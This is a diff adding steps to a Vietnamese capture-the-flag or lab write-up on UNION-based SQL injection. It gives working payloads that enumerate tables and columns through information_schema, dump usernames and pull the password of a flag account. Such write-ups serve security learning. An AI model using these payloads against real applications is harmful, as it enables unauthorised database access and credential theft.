@@ -40,4 +40,26 @@ Vì có 1 row nên sử dụng `GROUP_CONCAT(table_name)`, bị giới hạn use
 ```
 a' UNION SELECT GROUP_CONCAT(table_name) FROM  information_schema.tables -- 
 ```
-<img src='./img/Screenshot 2025-08-04 at 00.20.12.png'>
+<img src='./img/Screenshot 2025-08-04 at 00.20.12.png'>   
+
+Phát hiện ra có table có tên là `users`.  
+Tìm các xem trong `user` có nhưng column gì:  
+```
+a'UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';#
+```
+<img src='./img/Screenshot 2025-08-04 at 21.30.43.png'>  
+
+- tìm thấy `id,username,password` 3 cột này.
+- lấy hết các `username` xem có gì hay ko:
+```
+a'UNION SELECT GROUP_CONCAT(username) FROM users;#
+```
+<img src='./img/Screenshot 2025-08-04 at 21.43.24.png'>
+
+- thấy có username là `CBJS_FLAG` xem password của user này có gì ko.  
+```
+a'UNION SELECT password FROM users WHERE username='CBJS_FLAG';#
+```
+<img src='./img/Screenshot 2025-08-04 at 21.52.51.png'>  
+ 
+ Done
